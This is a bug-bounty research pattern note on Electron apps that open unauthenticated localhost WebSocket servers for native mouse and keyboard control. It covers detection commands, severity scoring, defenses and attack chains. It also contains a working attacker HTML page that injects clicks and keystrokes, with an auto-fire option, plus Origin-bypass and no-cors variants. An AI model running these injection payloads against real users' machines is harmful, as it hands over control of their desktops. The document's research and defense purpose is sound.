---
type: pattern
title: "Pattern - Localhost WebSocket Session-Bounded Unauth"
tags: [pattern, cwe-306, cwe-346, electron, websocket, localhost, lifecycle, native-control, mouse-injection, keyboard-injection, bb-pattern]
status: verified
last_updated: 2026-04-25
severity: P3 Medium (CVSS 6.8, session-bounded); P1 Critical (CVSS 9.6, always-on variant)
precedents: CVE-2019-13450 (Zoom always-on local server, 9.6 Critical), Cisco WebEx local agent 2020, Citrix HDX 2022, Slack RTM agent 2021
---

# Pattern - Localhost WebSocket Session-Bounded Unauth

## TL;DR

Electron app spawns a localhost WebSocket server with **no authentication, no Origin check, no token** -- binding an unprotected native input controller (mouse, keyboard) to a plain TCP port. Any page running in any browser can connect and inject native input.

The single most important distinction in severity assessment: **always-on vs session-bounded lifecycle**.

- **Always-on** (server starts at app launch, never dies) = Zoom CVE-2019-13450, CVSS **9.6 Critical**. Any malicious web page can attack at any time.
- **Session-bounded** (server forks only during a specific user action, killed when action ends) = CVSS **6.8 Medium**. Attack window is narrowed to the duration of the active session.

**Do not default to 9.6 because a Zoom precedent exists.** Verify the lifecycle first. Reporting session-bounded as always-on will earn a severity downgrade from triagers and damage credibility.

## Root-cause ingredients

### Ingredient 1: Fork via `child_process.fork` inside an IPC handler

```javascript
// mouseControl.js -- only reached when screen-share session is active
ipcMain.handle("internalShareScreenTipObj.startRemoteControlAsync", async (event, args) => {
  // Forks native mouse controller with NO auth configuration
  mouseControlProcess = child_process.fork(
    path.join(__dirname, "enigo-worker.js"),
    [],
    { stdio: "inherit" }
  );
  mouseControlProcess.send({ type: "start", port: MOUSE_WS_PORT });
});
```

Key point: the fork only occurs when the IPC handler fires. If screen-share is never started, the process never exists.

### Ingredient 2: WebSocket server with no `verifyClient`, no Origin check, no token

```javascript
// enigo-worker.js (forked subprocess)
const wss = new WebSocket.Server({ port: MOUSE_WS_PORT, host: "127.0.0.1" });

wss.on("connection", (ws) => {
  // No verifyClient callback
  // No Origin header check
  // No query-string token (e.g. ?token=SECRET)
  // No handshake challenge
  ws.on("message", (msg) => {
    const cmd = JSON.parse(msg);
    if (cmd.type === "mouseMove") enigo.mouseMoveTo(cmd.x, cmd.y);
    if (cmd.type === "mouseDown") enigo.mouseDown(cmd.button);
    if (cmd.type === "keyPress")  enigo.keyPress(cmd.key);
  });
});
```

Any origin can connect. Browsers do not enforce Same-Origin for WebSocket connections to `ws://127.0.0.1`.

### Ingredient 3: Session-bounded lifecycle -- fork on session start, kill on session end

```javascript
// Session end -- the process exits cleanly, closing the port
ipcMain.handle("internalShareScreenTipObj.stopRemoteControl", async () => {
  if (mouseControlProcess) {
    mouseControlProcess.send({ type: "exit" });
    mouseControlProcess = null;
  }
});
```

This is the lifecycle gate. The attack surface only exists between `startRemoteControlAsync` and the corresponding `stopRemoteControl` / session teardown.

### Ingredient 4: Native binding -- enigo-rs / robotjs / FFI to OS APIs

The forked subprocess uses a native module (Rust `enigo` crate or `robotjs` N-API addon) that calls directly into OS input APIs:
- **Windows**: `SendInput()` / `mouse_event()` via winapi
- **macOS**: `CGEventPost()` via CoreGraphics
- **Linux**: `XTestFakeMotionEvent()` via X11 XTest extension

These calls synthesize input that is **indistinguishable from physical hardware input** to the OS and all applications.

## Detection methodology

### Step 0: Determine always-on vs session-bounded (most important step)

```bash
# Kill the app entirely, then relaunch it
pkill -f "TargetApp"   # or whatever the app binary is
open -a "TargetApp"

# Immediately -- BEFORE performing any user action -- check for listening ports
lsof -i -P | grep LISTEN | grep 127.0.0.1
```

- **Port present at launch** = always-on -> CVSS 9.6, Zoom CVE-2019-13450 class
- **Port absent at launch** = session-bounded -> perform the trigger action, then re-run `lsof`

```bash
# Trigger the session (e.g., start screen share in the app)
# Then immediately:
lsof -i -P | grep LISTEN | grep 127.0.0.1
# Port now appears -> session-bounded, CVSS ~6.8
```

### Step 1: Auth check -- connect from any origin

```javascript
// Run this from browser devtools on any page (even google.com)
const ws = new WebSocket("ws://127.0.0.1:PORT");
ws.onopen = () => console.log("CONNECTED -- no auth challenge");
ws.onerror = () => console.log("Rejected");
```

Connection accepted with no challenge = CWE-306 (Missing Authentication).

### Step 2: Origin check

```javascript
// Does the server enforce Origin allowlist?
const ws = new WebSocket("ws://127.0.0.1:PORT");
// WebSocket API always sends Origin header; if connection accepted = no Origin check
// CWE-346 (Origin Validation Error)
```

### Step 3: Token check

Check the server source for `verifyClient` callback or `?token=` query parameter parsing. If absent = totally unauthenticated.

### Step 4: Capability map -- document what messages do

```javascript
ws.onopen = () => {
  ws.send(JSON.stringify({ type: "mouseMove", x: 200, y: 200 }));
  ws.send(JSON.stringify({ type: "mouseDown", button: "left" }));
  ws.send(JSON.stringify({ type: "mouseUp", button: "left" }));
  ws.send(JSON.stringify({ type: "keyPress", key: "Return" }));
};
```

Document every message type, effect, and whether it requires any prior auth state.

## Live verification SOP

```html
<!-- attacker.html -- hosted anywhere, including file:// or http://localhost:1337 -->
<!DOCTYPE html>
<script>
const PORT = 12345; // port discovered via lsof

function attack() {
  const ws = new WebSocket(`ws://127.0.0.1:${PORT}`);
  ws.onopen = () => {
    console.log("[+] Connected to victim mouse controller");
    // Move mouse to center of screen
    ws.send(JSON.stringify({ type: "mouseMove", x: 960, y: 540 }));
    // Simulate left click
    setTimeout(() => ws.send(JSON.stringify({ type: "mouseDown", button: "left" })), 200);
    setTimeout(() => ws.send(JSON.stringify({ type: "mouseUp",   button: "left" })), 400);
    // Type a string
    setTimeout(() => ws.send(JSON.stringify({ type: "keySequence", text: "injected" })), 600);
  };
  ws.onerror = (e) => console.log("[-] Not connected (session may not be active)");
}
</script>
<button onclick="attack()">Trigger</button>
<!-- Or auto-fire: <body onload="attack()"> -->
```

**Full attack flow (session-bounded variant):**

1. Victim runs the desktop app and starts a screen-share session
2. Attacker page auto-connects to `ws://127.0.0.1:PORT`
3. Attacker sends mouse/keyboard commands
4. Victim's OS processes the synthesized input -- attacker controls the desktop during the session
5. Session ends -> port closes -> attack window closes

## Variants

### Variant A: Always-on localhost server (Zoom CVE-2019-13450, CVSS 9.6 Critical)

Server starts at app launch, persists until app exits. Attack window = any time the app is running. No victim action required beyond having the app open.

### Variant B: Session-bounded fork (CVSS 6.8 Medium)

Server only exists during an active feature session (screen-share, remote-control, whiteboard, etc.). Victim must start the session, narrowing the attack window significantly. AC:H or UI:R in CVSS.

### Variant C: HTTP server (not WebSocket) variant

Same root cause -- unauthenticated localhost HTTP API for native control. Detection: `curl http://127.0.0.1:PORT/mouse/move?x=100&y=100`. CORS pre-flight restrictions apply but can often be bypassed with `mode: "no-cors"` for state-changing requests.

### Variant D: Bound to `0.0.0.0` instead of `127.0.0.1`

Dramatically worse. Server reachable from the local network, not just localhost. Any device on the same Wi-Fi / LAN can attack without requiring a browser on the victim machine. AV:A in CVSS -> bump to 8.8+ High/Critical.

### Variant E: Origin allowlist with bypass

Server checks `Origin` header but accepts `null` (file:// pages send `null`), or uses substring matching (accepts `evil-vendor.com` when allowlist is `vendor.com`). CWE-346 with bypass. Severity same as no-check.

## Real-world examples

| App / Finding | Year | Lifecycle | Auth | CVSS | Outcome |
|--------------|------|-----------|------|------|---------|
| **Zoom** (CVE-2019-13450) | 2019 | Always-on, persists after app uninstall | None | 9.6 Critical | Forced reinstall loop, remote camera enable; emergency patch in 24h |
| **Session-bounded desktop app** (mouseControl.js) | 2026 | Session-bounded (screen-share only) | None | ~6.8 Medium | Attacker-controlled native mouse/keyboard during session |
| **Cisco WebEx local agent** | 2020 | Always-on desktop agent | None | 9.3 Critical | Remote code execution via localhost API; CVE-2020-3263 |
| **Citrix HDX local engine** | 2022 | Always-on helper service | None | 8.8 High | Privilege escalation via local IPC; CVE-2022-21827 |
| **Slack RTM WebSocket agent** | 2021 | Always-on | Token (partial) | N/A (informational) | Token reuse possible across origins; patched quietly |

## Defense

```javascript
// Option 1: Per-session secret token in query string (minimum viable)
const SESSION_TOKEN = crypto.randomBytes(32).toString("hex");

const wss = new WebSocket.Server({
  port: PORT,
  host: "127.0.0.1",
  verifyClient: ({ req }) => {
    const url = new URL(req.url, "ws://localhost");
    return url.searchParams.get("token") === SESSION_TOKEN;
  }
});

// Share SESSION_TOKEN with the Electron renderer via a secure IPC message only
// Never expose to any web content / preload that untrusted origins can reach
```

```javascript
// Option 2: Origin allowlist
const ALLOWED_ORIGINS = ["app://vendor-app", "https://vendor.com"];

verifyClient: ({ origin }) => ALLOWED_ORIGINS.includes(origin)
// Note: null origin (file://) must be explicitly blocked
```

**Defense priority order:**

1. **Named pipe / Unix domain socket** instead of TCP -- not reachable from browser WebSocket API at all (`ws://` only works with TCP)
2. **Randomize port per session** -- prevents static port scanning; attacker must enumerate
3. **Per-session auth token** -- generated at fork time, passed via IPC, required on every connection
4. **Origin allowlist** -- secondary check, but `null` origin must be blocked explicitly
5. **Kill on idle** -- if no message received within N seconds, close the server; don't leave it open waiting

## Filing & severity

### Always-on variant

```
CVSS:3.1/AV:L/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H = 9.6 Critical
```

Any local process or browser tab can attack at any time the app is running. Scope:Changed because the attacker crosses from browser sandbox into OS input layer.

### Session-bounded variant

```
CVSS:3.1/AV:L/AC:H/PR:N/UI:R/S:C/C:H/I:H/A:H = 6.8 Medium
```

- **AC:H** -- attack only succeeds if victim has an active session running
- **UI:R** -- victim must have taken the action that starts the session
- Still S:C/C:H/I:H because native input control is a complete integrity violation

**Honest framing language for reports:**

> "This is a narrower variant of Zoom CVE-2019-13450 (CVSS 9.6 Critical). The critical difference is lifecycle: the vulnerable WebSocket server only exists during an active screen-share session (session-bounded), whereas the Zoom vulnerability used an always-on server that persisted even after the app was uninstalled. This lifecycle restriction reduces the effective attack window and warrants a lower severity of Medium (CVSS ~6.8)."

Do not write:
- "Similar to Zoom CVE-2019-13450, this is a Critical vulnerability" (lifecycle not equivalent)
- "CVSS 9.6" without verifying always-on vs session-bounded
- "Remote code execution" -- this is native input injection, not RCE (unless you can chain further)

## Chains

### Chain 1: Social engineering + drive-by attacker page -> 1-click native control

```
Attacker tricks victim into starting screen-share session
  -> Victim navigates to attacker-controlled page (or attacker page auto-loads in background tab)
  -> Page connects to ws://127.0.0.1:PORT
  -> Attacker injects mouse/keyboard commands
  -> Attacker can click UI elements, open terminals, exfiltrate files, install software
  -> Session ends -> connection drops -> attack window closed
```

### Chain 2: Custom Scheme Handler Injection -> reduce victim friction

```
Attacker sends victim a crafted vendorapp:// URI
  -> Custom scheme handler triggers startRemoteControlAsync IPC
  -> Session starts programmatically without victim awareness
  -> WebSocket port opens
  -> Drive-by page connects and attacks
```

Combining with [[Pattern - Electron Custom Scheme Handler Injection]] transforms session-bounded into near-always-on if the attacker can force the session to start.

### Chain 3: Extend session to keep port alive

If the attacker can keep the screen-share session alive (e.g., by suppressing the stop event via XSS in the renderer), the attack window extends indefinitely -- effectively becoming the always-on variant during the attack.

## Related

- [[Pattern - Electron Custom Scheme Handler Injection]] -- can be chained to force session start, widening attack window
